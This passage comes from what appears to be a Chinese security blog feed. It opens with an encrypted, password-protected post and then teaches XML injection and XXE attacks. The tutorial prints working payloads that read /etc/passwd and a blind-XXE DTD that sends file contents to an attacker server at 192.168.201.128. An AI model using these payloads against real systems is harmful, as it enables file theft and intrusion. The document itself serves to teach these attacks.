61626f613d09561f5e9c082ec513ba58427c353f815bcaa677f567050d0bc621eb8a49b70a16237754123e7f0efb6108d42419fe9daf74ed5cdb8587755d1799df63fc4543b7bf1e14339752c2cf75625dbf0ea627df303e2fef5e14a63656787901e7c291c2cb39f920b422001f808bcf699d310bcd41ad2338d5f7ef1e21a33bf276dc77f6c261b667c697eb0d2b34d81ffeed96cb047de3f7b086e5ddb7246cdbe90b20f3df380dfe6bcb408332025898d3d3354b60e8ece02e3de43d967dd551886dd2ff740f9e598da7c23151b3a8fc073d415ce597b577a959f08b5d16a48ed14ed8aaaf13b78d33d331a1821854aab095a7c79b36155c8a46cc636387d3cef94a0022b7a84ffb8ad7e294bca9ad5a6e76aed477465edb431022e435187e4346e1514ce27b221397227b97d4e4b873e0ff084873f7139e72c648627dd52e5c58999dc899ce9675d154f0060a13f8c03dfdaf4f83af2721d4030b29e58b61c5b92db7473e2c842ea2ee3a32d5c5c9b4ef7dd6070c2a4bb8afe96e44ec208655c0483300f6d3f6c3e1a4102683ca68f6250eb75b4e9e5635839b400e63aed0740642cb376f71d2c42aeab9aad1afd0bf4bae031a9724f28930d6a54775e4d5ce1dae959ef552515ebb960fca8f1184b5be275ae17b0da21d277331fd5997a2a26a31ca90d46b5bc07aa3cc03518517c2ade6e74c997ee4d2126de14fd01420d96efe5b1e43527614ce7890d1709f9612a72d8a2e3dfd35b39a1cb9bd68404e8121595964318ef3ba06385e09df1053332b4aa85ceabf4944b315faf79391334f986895d1f130cadbf6cadd83f18b514c8cd8a8d11552d441ea5294bcd737c7ec98aea7b358d51e3ea1cbf6932341de3ad07bdae33bfed79dc02a41b251f827d8c204c8ead9a8011048fc1825cd8149d58949e6ae1a2ca38fa9b8cf3c66a5fbe893993112e98890581a47205c2e939c018c873988d1f6cc3554a1ffe62f6ec11d46f7686e30f24934d3d4071b64b7825134b7baed131cb617d8eaed3aa673870df5a5e17e4ceacad33af70859b6b2af5e74a8a78d2c1c7042f50be54aad15a3afc5dd73d78a00c9fc8bcf1674139745653bd8c5596879cf078655415c91b6be5c2eeaf896d22e46e5c3bd96831a92fe0e6b899eb284a4bf271d92b7c65a68bbee48f40479b3fefe92d88666b710826f96b191cbc929fa147da2dd26cb4ce17d6ff3e9980042c823ff139eded81bf693372eaedb965b1c2747951c01f804b4e9807ffb2435979a6cbbda088d511d63fc0be910ad1042225b0e925a9452ebf8c0f8cc50e51af193bd4dd8c3730dcf7b07a01bb768e5098c6a6c1bbb73ee7326c2d0eded4af4e9c7580a13201ae48d7b39a467356230b837e3f6703e896695c2f8bea3f82b92099bb5e08e44fb372bf3b7c053168387baeb3cc0ae48cb4e7396cd3a9abf5c560f18366e57ac891997b521bef4cf4bcaa14fbcb7ed46f7d303ef7ee52ef80d3999712a3b5a67d6a0dd61c80216b0556b3a406c9326434e2513f630928324396b04b28e31a1e07b19b497e02b49d340251852477b42631784e046cee07a4ab366a4f04f469e8997c66d5c173897f38acd41c07969b440e286e87e46d934fb825117821fa45978f229f0ebf0f3e4198941f73dc9801e67d36cb7a31e64ef7ee731d82e8be48d5058551d70040f0f9f27479bee38248d8579927c210fc76c15215e8b5145de65b308b6a2d4db9f06a68144cb9a2714ff2b595102ed55aff7cafb1bac2bc705babd3f8064dcc4844f12c0966fa6a075368ba9e7bf1b824a519b97f7bd4ac638a09a57929ee306cbfe2226e8a103a4765f2cbfc6ae1d793196eb626c83422c6360b6738412184f4720b3d991028368325d586dc399b1845a02c644d5a4e3b5f033074dd4194fc4870768f99dcbbaebca0584e59648ef2f667dc4bfbda5d7baf9e0b7790a8cbe85a005ac161abdbd7035949639f24cfce2573326dc49de834850a63c8394f5919cf357466e0c82519ae606be10241aca9c3b773eef22641da0b5b33615c655b4cf29f00799f5cde741c77324b045d5d3eff38cb7bad63c85b678405aad983b64d9f73ed93a8e0ac9cc661454f2ddbcc1286589ce307d5d1a94336e256c8daea7f7ff60fa75beb457170e659a9312436e5f2770dd97ceffa69aae61317992d31e05759c02520a82c0b938a64ba68fda68dde6abafa8a07ced11edf0c7463120e8fd77ae981810dcffd842216688069b949394edd523f70fa10105953a0b6ceb135ed9ab91fe807ee9bac0963858998fdb82edf759fbbbe94e5776ec07e0629780cdf8bdda1d2b0be07b75475629dde0075fd2a6bd730b6c4edd4aba0c9b1121c6e73eb8359189ecbe379f28e560bf055f791d1f30b9ace416009ce845fa6fa86794d460093652d30358cabe3464ee1984d112ee8d897b7d6afed850ab3c35fc9f47e88bc87c7e79b518379ed402ce900d034c3287aeb8c3a39443173a6aeeb8e157947163b4561dc893b2a2bef7e4f3973b1aff77a12a4bfc45418e302f26c275b29d356c0471ca16bbe456cfedda9d1182d099eebdd662bc35cdcb2b8b0087d3893228a87906943d329218b1af4cd1a9421db997ee02cb0f5ebda659b2f830ed3022fade14489ac5353a831b9f93773b781810f7be31d7c61c979d9d55e301aace495fe6d417d2def4e3b79611053184f3f16d62970b026a1dc222d56f35c68bfffd6db0b7b1fd87b2f253b0b0b7f893c2749235adc56460db7a11ab659f36277aac9b458a2606092214c4fa97d54561267b1235e753af861a7a16c8cb56c9f3a251b556b941e2b0082b2f611e54c7632e68f18f9238281b8893980c586c5878432c00a11a025db50952826f15b5f790101c1a19e3cbb69208e5fc0fa00f321d60a4d09494aaa88eb72376469675bc3e2748a373cae069b31cc12e95514113758443aecff5399d1ac2b800b974734fe7f130df244ee2ce72a4c6517aeb4044302328c8472ef5269c7f9bd59a06f017e24daedf9b745d70bc83a905a853214acf1be0b291e893c7b405838680c3fd8a2d0bc9aedfd8ca51a7c26c067768daa0c2ae61c7661e4da346dd3f5fda2925ca819032094bcae845f860e298c66c2d967764a00ccd4478021891574318613db54ed9c510cc4a8fd335cc478f73bbb7694d6dfd4ab36aaae7baed49bb04611fde53e8b0256331861d58164255ee5e028a8ce3981154b828325e325c7b66e0c0a7e4bd57fc487e1a54a10a9a4afdfd849d47f3fc52791828acfb8098e7fa985fba3d4a3270677d5a435e4c594aa33593e10c33fd2f1755e210a028ca8caac1a78c4eca14ca7852f2f08a6fdc5d22f0fac5bae028a9267929cb9b09047ae1ef6cda810699f5c01f1c1bb1d351634d7bc2fb6a7dcf4436aa0eadbabf9275effe3ccd57d0e3547407fd213474ee115b133855ec5c4ec537ac6539af62409bad95d6839e980c92071d8bbb2bfe75ec2c98b6d9fa4786dcae37974fd3ee19356cb0178ea812fc64132bb688ab16eb2c29b50c351a615cb5a90a2c285a4c72feb9d1a5189b550e920bebd6afbcd8bed744bba30be5a4758950bdf33e71880b8015ef00a8ee2889d2b0eea944e214b871aa30a946349f40914a55bef649a46e5beba7d967b5c82d96e84fd3291ff18e36005ed03fab937292b329d2c5f636e84587632b88b99c88be2ceabb5e1656ab8019d3cb591ae3e2ea10d9fd0a6d292f1f5ceebee1d5e0370e5663fd117dab97569052d618c0942f6ead22312f6a9e9632305a2e1bdffb5ea214203de6c2bec681ea1c22d866d490e7af996118cb0f0c1610c1c3397a9fffdd95ac244b0e8d56e93b323a4bd75f042c8b740b7925aaa36318f873a7ca02cc8a3ee32df8706640ef91afc8c4dd241890e45077f886a76598b29edcd5275e0dd30d231da44bd03fd495ace0eaf26876d049a520730ef3a18bdb6ca9a2461642096e74ee7380ba428fdb7b546dae21323eb27ece69fc6ef2f48d4f4e34bb4b5c248c376ec7b96f0bceae8af041424b8b07aa814d73d13a43d8cc7a69caee1177825aa564879811805e351fb9e77ae65b78d3675647cd88a5a37e7a0d8d38b897eaff30c847b251b8451a70a85694691008f08ae609ccc7b67e5a3dd7857ca846b73f9c44e5df84ffbf2a09b995326eec85423c7b8789c5af2b3cc526234e4aa1c336590df5bd71e48517151c74024ff39b5d39ced1c9de3170e8cb51ba31c26c8f9cf05e23f5a6ce70ee566ae604645552de8dea045eb11fdc2904cf0595fb7df2f45a635fcdb1a3f980a21804fef8753ec8e9dc596fda5fd924e377b6e6e4c57793861a63edc875af917331b79e50ba9aeaab91d6ad7d4ce6a13558c62f77e47ff41f461a6d49028f7386452aeae9302229ce8508283e9b96dbcc7e16f81aad4fd87af227e9564ed41dce9841698673b731c2de818d14cc2510a199d3924ed5c1c45b2dc38b123afacead47eec1384bc44cad730f58e2329916e02a40af72b9759d089c8bf7eda941531cef51a28504fe1efd73c0f3adc820e098bb6694842e31a4f9e37f5f0aaa82909b8fec7be972ab6bb92000ce8c834d5e168976c55072d98b2a35c4cb3d8296ba7cdc809014132a5f5a49ad12db5a289329c5a805f62d5d259b85efd046f9ab8636619e8deff7b94fbe186986b0fb7331b3b5fba014726e6845c78fb2c8ca9aa8922611f6939a8150e49b5b8cce8fbe0a132027ef03d45e18cbf100bad3d6bfdf1d66b2323f58a5b4f3f7043d87328f1164319cf14fa586aec6565695be0120b4c25b0bec65619111b7b767fb4f5ab9481d201fccfa077fcc695f71eb92ec7ca2eb5a25d14ae8ce2dc63fd905711bd02ffd72201cdc8d333845ad521092c68c98c2915240c160c1634b79d336895afbb06061906928c0ccaaa5b86c373b07347aff00dde9a94bbfec59a6b54beff0b8c8abeb8bca79041032e3072a97a3c566eefda7ca698bad9b4528df9050226d3c3c6385955fd766f57e6a2dcb298b959a1f4707d7840e1b5b5dedadec7577cd5116f659046626a49ff88b1fbde32f7746243d282f5b0ddcfc2d402860e477c4e7267a8dd52fb5531669ee3317db76c0cfd109a0f37b9fb8db6faf39e9622ddfdeffadb4005795ae1e618dec3c942a346f26f9197a42b6c2041c122b0c013b51fecdfcb59f82bdd1bd8f01c9caa4ed5457e41483e56c4ff1d8edced0f8df305ea9bf575dba33a5276bbdbb8869a703ebd73751c4cd85173c7691e73788c5fd5db85a7961a2084df30b7ce1e4c7d5f2c08db2a47156c6bdb097d25a32a46e86d863462237771894b1f7b91517891b69e58616528d04cbdf4dbf8afb524925eb2451a150c534fc809957cd5e7953dfb768b3e549793101cf58e4badd69bbb0d8eb7eec7de591293e0461dea4eb46c1c148a2cea8eea105f5cb2b0a1</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">本文参考了他人的文章但找不到出处，故加密。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>文件上传</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XML漏洞</title>
    <link href="/2023/01/01/XML%E6%BC%8F%E6%B4%9E/"/>
    <url>/2023/01/01/XML%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="XML漏洞"><a href="#XML漏洞" class="headerlink" title="XML漏洞"></a>XML漏洞</h1><h2 id="XML格式"><a href="#XML格式" class="headerlink" title="XML格式"></a>XML格式</h2><blockquote><p>XML被设计用来传输和存储数据，其焦点是数据的内容。</p></blockquote><p>首先了解XML(可扩展标记语言)<br> 基本格式（内部DTD）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot;?&gt;                              &lt;!--xml文件的声明--&gt;<br>&lt;!DOCTYPE note [                                   &lt;!--定义此文档是 note 类型的文档--&gt;<br>&lt;!ELEMENT note (to,from,heading,body)&gt;             &lt;!--定义note元素有四个元素--&gt;<br>&lt;!ELEMENT to (#PCDATA)&gt;                            &lt;!--定义to元素为”#PCDATA”类型--&gt;<br>&lt;!ELEMENT from (#PCDATA)&gt;                          &lt;!--定义from元素为”#PCDATA”类型--&gt;<br>&lt;!ELEMENT head (#PCDATA)&gt;                          &lt;!--定义head元素为”#PCDATA”类型--&gt;<br>&lt;!ELEMENT body (#PCDATA)&gt;                          &lt;!--定义body元素为”#PCDATA”类型--&gt;<br>]&gt;<br>&lt;note&gt;<br>    &lt;to&gt;Y0u&lt;/to&gt;<br>    &lt;from&gt;@re&lt;/from&gt;<br>    &lt;head&gt;v3ry&lt;/head&gt;<br>    &lt;body&gt;g00d!&lt;/body&gt;<br>&lt;/note&gt;<br></code></pre></td></tr></table></figure><p>总的来说</p><p>第一部分：XML声明</p><p>第二部分：文档类型定义DTD   &#x2F;&#x2F;漏洞一般在此出现</p><p>第三部分：文档元素</p><h2 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h2><blockquote><p>DTD：用来约束XML文档定义语义约束分类</p></blockquote><h3 id="内部DTD"><a href="#内部DTD" class="headerlink" title="内部DTD"></a>内部DTD</h3><h3 id="外部DTD"><a href="#外部DTD" class="headerlink" title="外部DTD"></a>外部DTD</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!DOCTYPE 根元素名称 SYSTEM &quot;dtd路径&quot;&gt;<br><br>example:<br>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;<br>&lt;!DOCTYPE root-element SYSTEM &quot;test.dtd&quot;&gt;<br>&lt;note&gt;<br>    &lt;to&gt;Y0u&lt;/to&gt;<br>    &lt;from&gt;@re&lt;/from&gt;<br>    &lt;head&gt;v3ry&lt;/head&gt;<br>    &lt;body&gt;g00d!&lt;/body&gt;<br>&lt;/note&gt;<br><br></code></pre></td></tr></table></figure><h3 id="公共DTD"><a href="#公共DTD" class="headerlink" title="公共DTD"></a>公共DTD</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!DOCTYPE 根元素 PUBLIC &quot;DTD名称&quot; &quot;DTD文档的URL&quot;&gt;<br></code></pre></td></tr></table></figure><h2 id="DTD实体"><a href="#DTD实体" class="headerlink" title="DTD实体"></a>DTD实体</h2><blockquote><p>实体是用于定义引用普通文本或特殊字符的快捷方式的变量。</p></blockquote><p>按实体有无参分类</p><h3 id="一般实体"><a href="#一般实体" class="headerlink" title="一般实体"></a><strong>一般实体</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">声明<br>&lt;!ENTITY 实体名称 &quot;实体内容&quot;&gt;<br>引用方法<br>&amp;实体名称;<br></code></pre></td></tr></table></figure><h3 id="参数实体"><a href="#参数实体" class="headerlink" title="参数实体"></a>参数实体</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">声明<br>&lt;!ENTITY % 实体名称 &quot;实体内容&quot;&gt;<br>引用方法<br>%实体名称;<br></code></pre></td></tr></table></figure><p>按实体使用方式分类</p><pre><code class="hljs">1. 内部实体</code></pre><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;<br><br>example:<br>&lt;?xml version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;<br>&lt;!DOCTYPE test [    <br>    &lt;!ENTITY writer &quot;Dawn&quot;&gt;<br>    &lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt;<br>]&gt;<br>&lt;test&gt;&amp;writer;©right;&lt;/test&gt;<br></code></pre></td></tr></table></figure><ol start="2"><li>外部实体</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;<br><br>example:<br>&lt;?xml version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;<br>&lt;!DOCTYPE test [    <br>    &lt;!ENTITY writer &quot;Dawn&quot;&gt;<br>    &lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt;<br>]&gt;<br>&lt;test&gt;&amp;writer;©right;&lt;/test&gt;<br></code></pre></td></tr></table></figure><p>根据不同语言有以下可支持的协议：</p><p><img src="/img/XML%E6%BC%8F%E6%B4%9E_img/clip_image002-16969084628491.gif" alt="img"></p><h2 id="XML注入"><a href="#XML注入" class="headerlink" title="XML注入"></a>XML注入</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>与sql闭合类似，闭合标签达到更改、添加数据的效果</p><p>前提条件</p><pre><code class="hljs">1. 用户能够控制数据的输入1. 程序有拼凑的数据</code></pre><h3 id="example"><a href="#example" class="headerlink" title="example"></a>example</h3><p>test.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">manager</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">admin</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;1&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>admin<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>admin<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">admin</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">admin</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;2&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>zhangsa<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>123456<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">admin</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">manager</span>&gt;</span><br></code></pre></td></tr></table></figure><p>注入payload：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">123456<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">admin</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">admin</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;3&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>hack<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>hacker<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">admin</span>&gt;</span><br></code></pre></td></tr></table></figure><p>server接收结果</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">manager</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">admin</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;1&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>admin<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>admin<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">admin</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">admin</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;2&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>zhangsa<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>123456<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">admin</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">admin</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;3&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>hack<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>hacker<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">admin</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">manager</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这样就通过XML注入添加了一个名为<code>hack</code>，密码为<code>hacker</code>的管理员账户。<br> XML注入两大要素：<strong>标签闭合和获取XML表结构</strong></p><h2 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p><strong>外部引用</strong>可以支持http，file，ftp等协议<br>如果一个接口支持接收xml数据，且没有对xml数据做任何安全上的措施，就可能导致XXE漏洞<br>攻击者可以构造一个XML文档，文档里引用外部实体通过协议进行读取文件等操作<br>例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">一般实体+外部实体<br>&lt;?xml version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;<br>&lt;!DOCTYPE test [    <br>    &lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot;&gt;<br>]&gt;<br>&lt;test&gt;&amp;file;&lt;/test&gt;<br><br>参数实体+外部实体<br>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;<br>&lt;!DOCTYPE test [  <br>    &lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;<br>    %file;<br>]&gt;<br></code></pre></td></tr></table></figure><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><p>php中解析xml用的是libxml库</p><p>版本&lt;&#x3D;2.9.0的php中</p><p>simplexml_load_string()函数将正确的XML字符转化为php中的SimpleXMLElement对象</p><p>而&gt;2.9.0的，默认是禁止解析xml外部实体内容的</p><p>XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致攻击者可以构造一个恶意的XML</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/etc/</span>hosts <span class="hljs-comment">#主机名和ip配置文件</span><br><span class="hljs-regexp">/proc/</span>net/arp <span class="hljs-comment">#流量包的信息</span><br><span class="hljs-regexp">/proc/</span>net/tcp <span class="hljs-comment">#活动连接的信息</span><br><span class="hljs-regexp">/proc/</span>net/udp <span class="hljs-comment">#活动连接的信息</span><br><span class="hljs-regexp">/proc/</span>net/dev <span class="hljs-comment">#提供给用户读取或更改网络适配器及统计信息</span><br><span class="hljs-regexp">/proc/</span>net/fib_trie <span class="hljs-comment">#路由缓存</span><br></code></pre></td></tr></table></figure><h3 id="XXE攻击类别及实例"><a href="#XXE攻击类别及实例" class="headerlink" title="XXE攻击类别及实例"></a>XXE攻击类别及实例</h3><ol><li>有回显</li></ol><p>可以用下面的两种方式：</p><ul><li>直接使用外部实体调用<code>file://</code>、<code>php://filter/read=convert.base64-encode/resource=</code>等函数去读取本地文件</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?</span>xml version = <span class="hljs-string">&quot;1.0&quot;</span> encoding = <span class="hljs-string">&quot;utf-8&quot;</span><span class="hljs-meta">?&gt;</span><br>&lt;!DOCTYPE any [    <br>    &lt;!ENTITY file SYSTEM <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;<br>]&gt;<br>&lt;test&gt;&amp;file;&lt;/test&gt;<br></code></pre></td></tr></table></figure><ul><li>将外部实体引用的 URL 设置到本地服务器，本地构建恶意 dtd 文件，远程注入</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;<br>&lt;!DOCTYPE any [    <br>    &lt;!ENTITY file SYSTEM &quot;http://xxx.xxx.xxx/evil.dtd&quot;&gt;<br>%file;]&gt;<br>&lt;test&gt;&amp;evil;&lt;/test&gt;<br>    <br>//外部dtd内容   <br>&lt;!ENTITY evil SYSTEM &quot;file:///etc/passwd&quot; &gt;<br></code></pre></td></tr></table></figure><ol start="2"><li>无回显</li></ol><p>Blind XXE外带，建立dtd文件进行远程协议调用文件</p><p>Blind XXE原理</p><p>先在受害机调用<code>%dtd</code>，请求远程服务器(攻击服务器)上的<code>evil.dtd</code>。</p><p>再调用<code>evil.dtd</code>中的<code>%file</code>。<code>%file</code>获取受害机上面的敏感文件，然后将<code>%file</code>的返回结果传到<code>%send</code>。</p><p>然后受害机调用<code>%send</code>把读取到的数据发送到远程服务器上。</p><p>假设攻击机ip为：<code>192.168.201.128</code></p><p>vps上部署evil.dtd</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!ENTITY % payload &quot;&lt;!ENTITY % send SYSTEM &#x27;http://192.168.201.128/?content=%file;&#x27;&gt;&quot;&gt; %payload;<br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot;?&gt;<br>&lt;!DOCTYPE test[<br>    &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=D:/qwzf.txt&quot;&gt;<br>    &lt;!ENTITY % dtd SYSTEM &quot;http://192.168.201.128/evil.dtd&quot;&gt;<br>    %dtd;<br>    %send;<br>]&gt;<br></code></pre></td></tr></table></figure><p>进行XXE攻击后，服务器会把文件内容发送到攻击者服务器(apache日志记录)</p><p>攻击机上：<code>tail -f /var/log/apache2/access.log</code></p><h3 id="特殊协议攻击"><a href="#特殊协议攻击" class="headerlink" title="特殊协议攻击"></a>特殊协议攻击</h3><h4 id="执行系统命令"><a href="#执行系统命令" class="headerlink" title="执行系统命令"></a>执行系统命令</h4><p>条件：在安装expect扩展的PHP环境</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;<br>&lt;!DOCTYPE xxe 